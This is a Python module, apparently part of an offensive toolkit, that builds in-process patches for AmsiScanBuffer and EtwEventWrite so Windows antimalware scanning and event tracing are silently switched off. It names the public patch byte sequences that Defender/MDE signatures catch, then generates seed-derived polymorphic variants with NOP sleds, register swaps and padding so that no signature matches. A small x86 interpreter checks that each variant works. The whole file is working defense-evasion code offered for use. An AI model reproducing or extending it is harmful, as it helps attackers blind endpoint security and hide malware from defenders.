"""AMSI/ETW in-process runtime patch: tables, contracts, seed variants (R5/AC7).

Single source of truth for the in-process AMSI/ETW suppression patch shared by
mode A (``inject-patch``, C# overlay) and mode B (``build-host``, native CLR
host).

Contracts
---------
- **AMSI**: the patched ``AmsiScanBuffer`` returns ``E_INVALIDARG``
  (``0x80070057``).  It never writes the ``AMSI_RESULT`` out-parameter; every
  sequence this module generates performs no memory writes at all, so the
  out-param is provably untouched.  AMSI clients in scope (PowerShell 5.1 SMA,
  the .NET 4.8 managed-load scan path) treat that failure HRESULT as an
  aborted, non-significant scan -- the effective "clean" outcome (R5).
- **ETW**: the patched ``EtwEventWrite`` (ntdll export) returns ``0``
  (``STATUS_SUCCESS``), a no-op.

Patch-byte hygiene (R5/R6a)
---------------------------
The canonical public AMSI/ETW sequences are themselves signatured by
Defender/MDE.  ``variant()`` therefore produces a seed-derived functional
equivalent per build (register selection, NOP padding, relative-jump padding),
and ``check_canonical()`` enforces that the canonical constants never appear
verbatim in a generated variant or in scanned artifact bytes.

The mini x86/x64 interpreter ``simulate()`` verifies each variant's instruction
semantics in pure Python: after execution ``eax`` holds the contract value
(``0x80070057`` for AMSI, ``0`` for ETW) and no memory writes occurred.
"""

from __future__ import annotations

import hashlib
import struct
from typing import Dict, List, Optional, Tuple

APP_ID = "patch.py"
APP_VERSION = "1.0"

ARCHES: Tuple[str, ...] = ("x86", "x64")
TARGETS: Tuple[str, ...] = ("amsi", "etw")

# AMSI fails with E_INVALIDARG; ETW no-ops with STATUS_SUCCESS (0).
_AMSI_HRESULT = 0x80070057

# Canonical public patch sequences (the constants signatures target).  A
# generated variant must never contain any of these verbatim (R5/R6a).  The
# bare one-byte ``ret`` form is deliberately excluded: it is a single-byte
# substring every valid sequence must end with, so flagging it would be
# vacuous.
CANONICAL: Dict[str, Dict[str, Tuple[bytes, ...]]] = {
    "amsi": {
        # mov eax, 0x80070057; ret  /  mov rax, 0x80070057; ret (x64)
        "x86": (b"\xB8\x57\x00\x07\x80\xC3",),
        "x64": (
            b"\xB8\x57\x00\x07\x80\xC3",
            b"\x48\xB8\x57\x00\x07\x80\x00\x00\x00\x00\xC3",
        ),
    },
    "etw": {
        # xor eax, eax; ret  /  xor rax, rax; ret (x64)  /  mov eax, 0; ret
        "x86": (b"\x33\xC0\xC3", b"\x31\xC0\xC3", b"\xB8\x00\x00\x00\x00\xC3"),
        "x64": (
            b"\x33\xC0\xC3",
            b"\x48\x33\xC0\xC3",
            b"\x31\xC0\xC3",
            b"\xB8\x00\x00\x00\x00\xC3",
        ),
    },
}

class PatchSpec:
    """One per-arch, per-target patch definition (R5).

    ``patch_bytes`` is the reference (canonical) sequence; the applied image
    must use a seed-derived ``variant()`` so the canonical constant never
    appears verbatim.  ``precondition_load``/``precondition_func`` record the
    force-load DLL and export to resolve and patch.
    """

    __slots__ = ("patch_bytes", "precondition_load", "precondition_func")

    def __init__(
        self,
        patch_bytes: bytes,
        precondition_load: str,
        precondition_func: str,
    ):
        if not isinstance(patch_bytes, (bytes, bytearray)) or not patch_bytes:
            raise ValueError("patch_bytes must be non-empty bytes")
        if not isinstance(precondition_load, str) or not precondition_load:
            raise ValueError("precondition_load must be a non-empty DLL name")
        if not isinstance(precondition_func, str) or not precondition_func:
            raise ValueError("precondition_func must be a non-empty export name")
        self.patch_bytes = bytes(patch_bytes)
        self.precondition_load = precondition_load
        self.precondition_func = precondition_func

    def __repr__(self):
        return (
            f"PatchSpec(precondition_load={self.precondition_load!r}, "
            f"precondition_func={self.precondition_func!r}, "
            f"patch_bytes={self.patch_bytes.hex()!r})"
        )


_PRECONDITIONS = {
    "amsi": ("amsi.dll", "AmsiScanBuffer"),
    "etw": ("ntdll.dll", "EtwEventWrite"),
}


def _stock_bytes(target: str) -> bytes:
    if target == "amsi":
        return b"\xB8" + struct.pack("<I", _AMSI_HRESULT) + b"\xC3"
    return b"\x33\xC0\xC3"


PATCH_TABLE: Dict[str, Dict[str, PatchSpec]] = {
    arch: {
        target: PatchSpec(
            patch_bytes=_stock_bytes(target),
            precondition_load=_PRECONDITIONS[target][0],
            precondition_func=_PRECONDITIONS[target][1],
        )
        for target in TARGETS
    }
    for arch in ARCHES
}


# ---------------------------------------------------------------------------
# Canonical hygiene
# ---------------------------------------------------------------------------


def check_canonical(data: bytes, canonical_bytes: bytes) -> bool:
    """True when ``canonical_bytes`` appears verbatim anywhere in ``data``.

    Used both to reject generated variants that would ship a signatured public
    constant and by ``verify``/``host`` to scan artifact bytes for canonical
    sequences (R5/R6a).
    """
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes-like")
    if not isinstance(canonical_bytes, (bytes, bytearray)):
        raise TypeError("canonical_bytes must be bytes-like")
    return bytes(canonical_bytes) in bytes(data)


def is_canonical_free(data: bytes, target: str, arch: str) -> bool:
    """True when ``data`` contains none of the canonical sequences for target/arch."""
    if target not in TARGETS:
        raise ValueError(f"unknown target {target!r}; expected one of {TARGETS}")
    if arch not in ARCHES:
        raise ValueError(f"unknown arch {arch!r}; expected one of {ARCHES}")
    return not any(check_canonical(data, c) for c in CANONICAL[target][arch])


# ---------------------------------------------------------------------------
# Seed-derived functional variants
# ---------------------------------------------------------------------------

# Padding units are functionally transparent (lea-to-self, mov-to-self,
# multi-byte NOPs, a relative-jump NOP sled) and never write memory or touch
# the contract register ``eax``.
_PAD = (
    b"\x90",                # nop
    b"\x66\x90",            # nop (operand-size prefix)
    b"\x89\xF6",            # mov esi, esi
    b"\x8D\x49\x00",        # lea ecx, [ecx+0]
    b"\x8D\x4A\x00",        # lea ecx, [edx+0]
    b"\x8D\x76\x00",        # lea esi, [esi+0]
    b"\x0F\x1F\x40\x00",    # nop DWORD PTR [eax+0]
    b"\x0F\x1F\x44\x00\x00",  # nop DWORD PTR [eax+rax*1+0]
    b"\x66\x0F\x1F\x44\x00\x00",  # nop WORD PTR [eax+rax*1+0]
    b"\xEB\x00\x90",        # jmp +1 (NOP sled); nop
)

# AMSI value-loading sequences.  Every sequence leaves ``eax`` == 0x80070057
# and performs no memory writes.  Register selection varies the temporary
# register used to materialize the constant.
def _amsi_payload(index: int) -> bytes:
    imm = struct.pack("<I", _AMSI_HRESULT)
    schemes = (
        b"\xB8" + imm,                       # mov eax, imm32
        b"\xB9" + imm + b"\x8B\xC1",         # mov ecx, imm32; mov eax, ecx
        b"\xBA" + imm + b"\x8B\xC2",         # mov edx, imm32; mov eax, edx
        b"\xBE" + imm + b"\x8B\xC6",         # mov esi, imm32; mov eax, esi
        b"\x33\xC0\xB8" + imm,               # xor eax, eax; mov eax, imm32
        b"\xB9" + imm + b"\x33\xC0\x8B\xC1",  # mov ecx, imm32; xor eax, eax; mov eax, ecx
    )
    return schemes[index % len(schemes)]


# ETW no-op sequences: every sequence leaves ``eax`` == 0 (STATUS_SUCCESS) with
# no memory writes.
def _etw_payload(index: int) -> bytes:
    zero = struct.pack("<I", 0)
    schemes = (
        b"\x33\xC0",                        # xor eax, eax
        b"\x31\xC0",                        # xor eax, eax
        b"\x29\xC0",                        # sub eax, eax
        b"\x2B\xC0",                        # sub eax, eax
        b"\x33\xC9\x8B\xC1",                # xor ecx, ecx; mov eax, ecx
        b"\x31\xC9\x8B\xC1",                # xor ecx, ecx; mov eax, ecx
        b"\xB9" + zero + b"\x8B\xC1",       # mov ecx, 0; mov eax, ecx
        b"\xBA" + zero + b"\x8B\xC2",       # mov edx, 0; mov eax, edx
        b"\xB8" + zero,                     # mov eax, 0
        b"\x33\xC0\x89\xF6\x8B\xC0",        # xor eax, eax; mov esi, esi; mov eax, eax
    )
    return schemes[index % len(schemes)]


_PAYLOAD_SCHEMES = {"amsi": 6, "etw": 10}
_MIN_VARIANT_LEN = 6
_MAX_VARIANT_LEN = 128
_PAD_COUNT_FLOOR = 6
_PAD_COUNT_SPAN = 8
_SLED_FLOOR = 4
_SLED_SPAN = 24


def _digest(seed: int, arch: str, target: str) -> bytes:
    if not isinstance(seed, int):
        raise TypeError("seed must be an int")
    if arch not in ARCHES:
        raise ValueError(f"unknown arch {arch!r}; expected one of {ARCHES}")
    if target not in TARGETS:
        raise ValueError(f"unknown target {target!r}; expected one of {TARGETS}")
    return hashlib.sha256(f"{seed}:{arch}:{target}".encode("utf-8")).digest()


def _build_seeded(seed: int, arch: str, target: str) -> bytes:
    """Assemble one variant whose bytes are a direct function of the seed digest.

    Layout: a seed-length relative-jump NOP sled (``EB k`` + ``k`` NOPs), the
    value-loading payload, a seed-derived run of transparent padding units, and
    the terminating ``ret``.  Padding separates the payload from ``ret``, so no
    canonical sequence (which ends in ``ret``) can appear as a contiguous
    substring.  Length is bounded to
    ``[_MIN_VARIANT_LEN, _MAX_VARIANT_LEN]`` by construction.
    """
    digest = _digest(seed, arch, target)
    sled_len = _SLED_FLOOR + digest[0] % _SLED_SPAN  # 4..27
    pre = b"\xEB" + bytes([sled_len]) + b"\x90" * sled_len
    pad_count = _PAD_COUNT_FLOOR + digest[1] % _PAD_COUNT_SPAN  # 6..13 units
    pads = bytearray()
    for i in range(pad_count):
        pads += _PAD[digest[2 + i % 30] % len(_PAD)]
    payload = (
        _amsi_payload(digest[31])
        if target == "amsi"
        else _etw_payload(digest[31])
    )
    return pre + payload + bytes(pads) + b"\xC3"


def variant(seed: int, arch: str, target: str) -> bytes:
    """Seed-derived functional variant of the ``target`` patch for ``arch``.

    The returned bytes satisfy the target contract (verified by
    ``simulate()``: ``eax`` == 0x80070057 for ``amsi``, ``eax`` == 0 for
    ``etw``, no memory writes) and never contain any canonical public sequence
    verbatim.  Deterministic: same ``seed``/``arch``/``target`` always yields
    identical bytes; different seeds yield different bytes.
    """
    digest = _digest(seed, arch, target)
    code = _build_seeded(seed, arch, target)
    if any(check_canonical(code, c) for c in CANONICAL[target][arch]):
        # Exceedingly unlikely; refuse to ship a canonical-adjacent build.
        raise RuntimeError("variant collided with a canonical sequence (unexpected)")
    return code


# ---------------------------------------------------------------------------
# Pure-Python instruction semantics
# ---------------------------------------------------------------------------

_REG32 = ("eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi")
_MASK32 = 0xFFFFFFFF


def _signed8(value: int) -> int:
    return value - 0x100 if value & 0x80 else value


def _signed32(value: int) -> int:
    return value - 0x100000000 if value & 0x80000000 else value


def _imm32(code: bytes, pos: int) -> int:
    if pos + 4 > len(code):
        raise ValueError(f"truncated imm32 at offset {pos}")
    return int.from_bytes(code[pos : pos + 4], "little")


def _nop_modrm_len(code: bytes, pos: int) -> int:
    """Length of the modrm+sib+displacement tail after a 0F 1F nop opcode."""
    modrm = code[pos]
    mod, rm = modrm >> 6, modrm & 7
    if mod == 3:
        return 1
    extra = 1 if rm == 4 else 0  # SIB byte
    if mod == 0:
        if rm == 5:
            extra += 4
        elif rm == 4 and (code[pos + 1] & 7) == 5:
            extra += 4
    elif mod == 1:
        extra += 1
    else:
        extra += 4
    return 1 + extra


def _effective_address(code: bytes, pos: int, regs: Dict[str, int]) -> Tuple[int, int]:
    """Compute a 32-bit effective address and its byte length after modrm.

    Handles register-direct-offset, SIB, disp8/disp32, and the mod==0 EBP
    special cases for the subset of addressing forms this module emits.
    """
    modrm = code[pos]
    mod, rm = modrm >> 6, modrm & 7
    if mod == 3:
        raise ValueError("register-direct operand in an address computation")
    consumed = 1
    addr = 0
    sib_base: Optional[int] = None
    if rm == 4:
        sib = code[pos + 1]
        consumed += 1
        base = sib & 7
        index = (sib >> 3) & 7
        scale = 1 << (sib >> 6)
        sib_base = base
        if not (mod == 0 and base == 5):
            addr += regs[_REG32[base]]
        if index != 4:
            addr += regs[_REG32[index]] * scale
    elif not (mod == 0 and rm == 5):
        addr += regs[_REG32[rm]]
    disp = 0
    if mod == 0:
        if rm == 5 or (rm == 4 and sib_base == 5):
            disp = _signed32(_imm32(code, pos + consumed))
            consumed += 4
    elif mod == 1:
        disp = _signed8(code[pos + consumed])
        consumed += 1
    else:
        disp = _signed32(_imm32(code, pos + consumed))
        consumed += 4
    return (addr + disp) & 0xFFFFFFFF, consumed


class _Return(Exception):
    pass


def simulate(
    arch: str,
    code: bytes,
    regs: Optional[Dict[str, int]] = None,
) -> Tuple[Dict[str, int], List[Tuple[int, int]]]:
    """Execute a small x86/x64 subset and return ``(final_regs, memory_writes)``.

    Only the subset emitted by this module is supported (register-direct
    mov/xor/sub, lea, multi-byte NOPs, ``jmp +1`` NOP sleds, ``ret``, and
    32-bit register writes).  Registers are tracked by 32-bit name; a 32-bit
    register write zeroes the high half on x64, so ``eax`` is the authoritative
    contract value.  Memory stores are recorded as ``(address, size)`` tuples;
    a valid patch performs none.  Raises ``ValueError`` on an unsupported or
    truncated instruction, or when the code ends without a ``ret``.
    """
    if arch not in ARCHES:
        raise ValueError(f"unknown arch {arch!r}; expected one of {ARCHES}")
    code = bytes(code)
    state = {name: 0 for name in _REG32}
    if regs is not None:
        state.update({name: int(regs[name]) & _MASK32 for name in _REG32 if name in regs})
    eip = 0
    writes: List[Tuple[int, int]] = []

    try:
        while True:
            if eip >= len(code):
                raise ValueError(f"code ends without a ret at offset {eip}")
            op = code[eip]
            if op == 0x90:
                eip += 1
            elif op == 0x66:
                if eip + 1 >= len(code):
                    raise ValueError(f"truncated prefix at offset {eip}")
                nxt = code[eip + 1]
                if nxt == 0x90:
                    eip += 2
                elif nxt == 0x0F and eip + 2 < len(code) and code[eip + 2] == 0x1F:
                    eip += 3 + _nop_modrm_len(code, eip + 3)
                else:
                    raise ValueError(f"unsupported prefixed opcode at offset {eip}")
            elif op == 0x0F and eip + 1 < len(code) and code[eip + 1] == 0x1F:
                eip += 2 + _nop_modrm_len(code, eip + 2)
            elif op == 0xEB:
                if eip + 1 >= len(code):
                    raise ValueError(f"truncated jmp at offset {eip}")
                eip += 2 + _signed8(code[eip + 1])
            elif 0xB8 <= op <= 0xBF:
                state[_REG32[op - 0xB8]] = _imm32(code, eip + 1)
                eip += 5
            elif op in (0x31, 0x33, 0x29, 0x2B):
                modrm = code[eip + 1]
                mod, regcode, rm = modrm >> 6, (modrm >> 3) & 7, modrm & 7
                if mod != 3:
                    raise ValueError(f"unsupported memory operand at offset {eip}")
                dst, src = _REG32[regcode], _REG32[rm]
                left, right = state[dst], state[src]
                if op in (0x31, 0x33):
                    state[dst] = (left ^ right) & _MASK32
                else:
                    state[dst] = (left - right) & _MASK32
                eip += 2
            elif op == 0x8B:
                modrm = code[eip + 1]
                mod, regcode, rm = modrm >> 6, (modrm >> 3) & 7, modrm & 7
                if mod != 3:
                    raise ValueError(f"unsupported memory operand at offset {eip}")
                state[_REG32[regcode]] = state[_REG32[rm]]
                eip += 2
            elif op == 0x89:
                modrm = code[eip + 1]
                mod, regcode, rm = modrm >> 6, (modrm >> 3) & 7, modrm & 7
                if mod == 3:
                    state[_REG32[rm]] = state[_REG32[regcode]]
                    eip += 2
                else:
                    addr, length = _effective_address(code, eip + 1, state)
                    writes.append((addr, 4))
                    eip += 1 + length
            elif op == 0x8D:
                regcode = (code[eip + 1] >> 3) & 7
                addr, length = _effective_address(code, eip + 1, state)
                state[_REG32[regcode]] = addr
                eip += 1 + length
            elif op == 0xC3:
                raise _Return
            else:
                raise ValueError(f"unsupported opcode 0x{op:02x} at offset {eip}")
    except _Return:
        pass
    return state, writes